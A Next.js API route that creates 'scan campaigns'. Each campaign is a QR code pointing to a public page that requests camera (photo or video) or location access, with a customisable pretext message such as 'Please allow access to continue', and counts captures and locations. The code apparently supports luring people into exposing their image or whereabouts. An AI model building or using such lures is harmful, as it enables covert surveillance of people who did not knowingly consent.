// @ts-nocheck
import {NextResponse} from "next/server";
import {getSession} from "@/lib/auth";
import {getDb} from "@/lib/mongodb";
import {makeQrDataUrl} from "@/lib/qr";
import crypto from "crypto";
export async function POST(req:Request){
 const s=await getSession();if(!s)return NextResponse.json({error:"Unauthorized"},{status:401});
 try{
  const body=await req.json(),name=String(body.name||"").trim();
  if(!name)return NextResponse.json({error:"Enter a scan name"},{status:400});
  const type=body.type==="location"?"location":"camera";
  const mode=body.mode==="video"?"video":"photo",camera=body.camera==="front"?"front":"back";
  const title=String(body.title||name),message=String(body.message||"Please allow access to continue.");
  const slug=crypto.randomBytes(9).toString("base64url"),base=process.env.NEXT_PUBLIC_APP_URL||"https://skanmakery.vercel.app",publicUrl=base+"/scan/"+slug,db=await getDb();
  const creatorEmail=String(s.email||process.env.ADMIN_GMAIL||process.env.ADMIN_EMAIL||"").trim().toLowerCase();
  await db.collection("scan_campaigns").insertOne({userId:s.userId,creatorEmail,creatorName:String(s.name||"SkanMakery creator"),name,title,message,type,mode,camera,seconds:10,slug,active:true,createdAt:new Date(),updatedAt:new Date(),views:0,captures:0,locations:0});
  return NextResponse.json({ok:true,qrUrl:await makeQrDataUrl(publicUrl),publicUrl,slug});
 }catch(e){console.error(e);return NextResponse.json({error:"Could not create scan"},{status:500});}
}